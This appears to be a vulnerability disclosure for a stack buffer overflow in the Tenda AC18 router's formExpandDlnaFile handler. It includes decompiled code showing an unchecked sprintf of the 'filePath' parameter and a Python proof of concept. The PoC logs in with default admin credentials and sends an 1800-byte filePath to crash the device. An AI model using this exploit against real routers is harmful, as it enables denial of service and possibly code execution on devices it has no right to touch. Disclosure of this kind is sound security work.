
## Tenda AC18 stack overflow vulnerability

### * Version

V15.03.05.19_multi (ac18_kf_V15.03.05.19(6318_)_cn.bin)

### * Firmware
[https://www.tenda.com.cn/download/detail-2683.html](https://www.tenda.com.cn/download/detail-2683.html)




### * Vulnerability Detail

In function formExpandDlnaFile, the content obtained by the program from the parameter "filePath" is passed to local_24, 
and then the local_24 is directly copied into the acStack1092 stack through the sprintf function.
There is no size check, so there is a stack overflow vulnerability. The attacker can easily perform a Deny of Service Attack or Remote Code Execution with carefully crafted overflow data.


```c
void formExpandDlnaFile(undefined4 param_1)

{
  int iVar1;
  undefined4 uVar2;
  undefined auStack6468 [256];
  char acStack6212 [5120];
  char acStack1092 [512];
  char acStack580 [512];
  int local_44;
  DIR *local_40;
  dirent *local_3c;
  undefined4 local_38;
  undefined4 local_34;
  undefined4 local_30;
  void *local_2c;
  undefined4 local_28;
  undefined4 local_24;
  char *local_20;
  int local_1c;
  int local_18;
  int local_14;
  
  local_24 = 0;
  local_28 = 0;
  local_2c = (void *)0x0;
  local_30 = 0;
  local_34 = 0;
  local_38 = 0;
  local_3c = (dirent *)0x0;
  local_40 = (DIR *)0x0;
  memset(acStack580,0,0x200);
  memset(acStack1092,0,0x200);
  memset(acStack6212,0,0x1400);
  memset(auStack6468,0,0x100);
  local_44 = 0;
  local_14 = 0;
  local_18 = 0;
  local_1c = 0;
  local_20 = (char *)0x0;
  local_24 = FUN_0002b884(param_1,"filePath",&DAT_000f2e24);
  local_28 = FUN_0002b884(param_1,"folderGrade",&DAT_000f2e24);
  GetValue("dlna.db",auStack6468);
  sprintf(acStack1092,"%s/%s","/var/etc/upan",local_24);  //here is overflow
  local_20 = acStack1092;
  while (local_20 = strchr(local_20,0x2f), local_20 != (char *)0x0) {
    local_1c = local_1c + 1;
    local_20 = local_20 + 1;
  }
  local_30 = FUN_00041bfc();
  local_34 = FUN_00041bc0();
...
}
```

### * POC
```python
import requests


cmd  = b'filePath=' + b'A' * 1800 + '&folderGrade=1&subfileList=aaaaaaaaa'


url = b"http://192.168.2.2/login/Auth"
payload = b"http://192.168.2.2/goform/expandDlnaFile/?" + cmd

data = {
    "username": "admin",
    "password": "admin",
}

def attack():
    s = requests.session()
    resp = s.post(url=url, data=data)
    print(resp.content)
    resp = s.post(url=payload, data=data)
    print(resp.content)

attack()

```


